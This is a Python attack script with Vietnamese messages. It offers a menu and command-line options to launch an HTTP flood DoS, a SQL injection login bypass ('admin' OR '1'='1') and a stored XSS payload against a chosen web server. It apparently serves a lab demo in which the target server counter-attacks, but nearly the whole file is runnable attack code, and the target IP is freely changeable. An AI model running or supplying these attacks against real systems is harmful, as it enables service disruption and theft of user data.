#!/usr/bin/env python3
"""
attacker.py - Cong cu tan cong kiem thu va ghi nhan phan don
Ho tro ca 2 che do:
1. Chay tuong tac co Menu de chon (khong can go tham so dai): python3 attacker.py
2. Chay dong lenh CLI truc tiep: python3 attacker.py --ip ... --attack ...
"""
import sys
import time
import argparse
import urllib.request
import urllib.parse
import urllib.error
import json
import threading

def check_server_health(target_ip, target_port):
    url = f"http://{target_ip}:{target_port}/api/health"
    start = time.time()
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "HealthMonitor/1.0"})
        with urllib.request.urlopen(req, timeout=2.5) as resp:
            elapsed = (time.time() - start) * 1000
            data = json.loads(resp.read().decode())
            return True, round(elapsed, 1), data.get("status")
    except urllib.error.HTTPError as e:
        elapsed = (time.time() - start) * 1000
        return False, round(elapsed, 1), f"HTTP_{e.code}"
    except Exception as e:
        elapsed = (time.time() - start) * 1000
        return False, round(elapsed, 1), f"SOCKET_DROPPED ({e})"

def attack_dos(target_ip, target_port, duration_sec=15):
    print(f"\n[+] Dang phat dong tan cong DoS vao http://{target_ip}:{target_port}/api/search...")
    url = f"http://{target_ip}:{target_port}/api/search?q=dos_flood_attack"
    stop_event = threading.Event()
    results = {"total_sent": 0, "success": 0, "crashed_503": 0, "dropped_by_os": 0}
    lock = threading.Lock()

    def flood_worker():
        while not stop_event.is_set():
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "DoS-Attacker/2.0"})
                with urllib.request.urlopen(req, timeout=1.5) as r:
                    with lock:
                        results["total_sent"] += 1
                        if r.status == 200:
                            results["success"] += 1
            except urllib.error.HTTPError as e:
                with lock:
                    results["total_sent"] += 1
                    if e.code == 503:
                        results["crashed_503"] += 1
            except Exception:
                with lock:
                    results["total_sent"] += 1
                    results["dropped_by_os"] += 1
            time.sleep(0.05)

    threads = [threading.Thread(target=flood_worker, daemon=True) for _ in range(15)]
    for t in threads:
        t.start()

    start_t = time.time()
    for remain in range(duration_sec, 0, -1):
        if results["dropped_by_os"] > 15 and results["crashed_503"] < 5:
            break
        elapsed = int(time.time() - start_t)
        with lock:
            sent = results["total_sent"]
            c503 = results["crashed_503"]
            drop = results["dropped_by_os"]
        sys.stdout.write(f"\r[+] Goi gui: {sent} | Loi 503: {c503} | Bi drop: {drop} | Thoi gian: {elapsed}/{duration_sec}s")
        sys.stdout.flush()
        time.sleep(1.0)

    stop_event.set()
    for t in threads:
        t.join(timeout=0.5)
    print()

    after_ok, after_latency, after_status = check_server_health(target_ip, target_port)
    if results["crashed_503"] >= 10 or after_status == "HTTP_503":
        print(f"[+] Bang chung DoS: May chu da bi sap va tra ve loi 503 Service Unavailable ({results['crashed_503']} yeu cau bi tu choi).")
    elif results["dropped_by_os"] > 10 or "SOCKET_DROPPED" in str(after_status):
        print(f"[-] Phan don tu may chu: Ban da bi tan cong nguoc! IP cua ban da bi Tuong lua may chu khoa toan bo ket noi ({results['dropped_by_os']} goi bi huy).")
    else:
        print(f"[*] Hoan tat dot DoS. Trang thai may chu: {after_status}")

def attack_sqli(target_ip, target_port):
    print(f"\n[+] Dang phat dong tan cong SQL Injection vao http://{target_ip}:{target_port}/api/login...")
    payload = urllib.parse.quote("admin' OR '1'='1")
    url = f"http://{target_ip}:{target_port}/api/login?user={payload}&pass=any"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Attacker-SQLi/2.0"})
        with urllib.request.urlopen(req, timeout=3.0) as resp:
            data = json.loads(resp.read().decode())
            print("[+] Bang chung SQL Injection: Trich xuat thanh cong du lieu tu may chu:")
            for u in data.get("leaked_database", []):
                print(f"    ID: {u['id']} | Ten: {u['full_name']} | Tai khoan: {u['username']} | So du: {u['balance']}")
    except Exception as e:
        print("[-] Phan don tu may chu: Ban da bi tan cong nguoc! IP cua ban da bi Tuong lua may chu khoa toan bo ket noi.")

def attack_xss(target_ip, target_port):
    print(f"\n[+] Dang phat dong tan cong XSS vao http://{target_ip}:{target_port}/api/comment...")
    script_payload = urllib.parse.quote("<script>alert(1)</script>")
    url = f"http://{target_ip}:{target_port}/api/comment?author=Attacker&content={script_payload}"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Attacker-XSS/2.0"})
        with urllib.request.urlopen(req, timeout=3.0) as resp:
            print("[+] Bang chung XSS: May chu da chap nhan va luu ma doc vao he thong.")
    except Exception as e:
        print("[-] Phan don tu may chu: Ban da bi tan cong nguoc! IP cua ban da bi Tuong lua may chu khoa toan bo ket noi.")

def interactive_menu():
    target_ip = "192.168.144.1"
    target_port = 8080

    print("\n" + "=" * 55)
    print("      BANG DIEU KHIEN TAN CONG (ATTACKER SUITE)")
    print("=" * 55)
    custom_ip = input(f"Nhap IP Web Server can tan cong [Mac dinh: {target_ip}]: ").strip()
    if custom_ip:
        target_ip = custom_ip

    while True:
        print("\n" + "-" * 55)
        print(f"MUC TIEU HIEN TAI: http://{target_ip}:{target_port}/")
        print("-" * 55)
        print("  [1] Tan cong DoS (Lam sap Web Server)")
        print("  [2] Tan cong SQL Injection (Trich xuat CSDL)")
        print("  [3] Tan cong XSS (Tiem ma doc vao binh luan)")
        print("  [4] Ban lien tiep ca 3 don (DoS + SQLi + XSS)")
        print("  [5] Doi IP muc tieu khac")
        print("  [0] Thoat")
        print("-" * 55)
        choice = input("Chon phuong thuc tan cong (0-5): ").strip()

        if choice == "1":
            attack_dos(target_ip, target_port)
        elif choice == "2":
            attack_sqli(target_ip, target_port)
        elif choice == "3":
            attack_xss(target_ip, target_port)
        elif choice == "4":
            attack_dos(target_ip, target_port, duration_sec=8)
            time.sleep(1)
            attack_sqli(target_ip, target_port)
            time.sleep(1)
            attack_xss(target_ip, target_port)
        elif choice == "5":
            new_ip = input("Nhap IP Web Server moi: ").strip()
            if new_ip:
                target_ip = new_ip
        elif choice == "0":
            print("[*] Tam biet!")
            break
        else:
            print("[!] Lua chon khong hop le, vui long chon lai.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Attacker Client Suite")
    parser.add_argument("--ip", type=str, default=None, help="IP Web Server")
    parser.add_argument("--port", type=int, default=8080, help="Port Web Server (default 8080)")
    parser.add_argument("--attack", choices=["dos", "sqli", "xss", "all"], default=None, help="Chon don tan cong")
    args = parser.parse_args()

    # Neu chay khong co tham so -> Bat Menu tuong tac
    if not args.ip and not args.attack:
        interactive_menu()
    else:
        ip = args.ip or "192.168.144.1"
        port = args.port or 8080
        if args.attack == "dos":
            attack_dos(ip, port)
        elif args.attack == "sqli":
            attack_sqli(ip, port)
        elif args.attack == "xss":
            attack_xss(ip, port)
        elif args.attack == "all":
            attack_dos(ip, port)
            attack_sqli(ip, port)
            attack_xss(ip, port)
        else:
            interactive_menu()
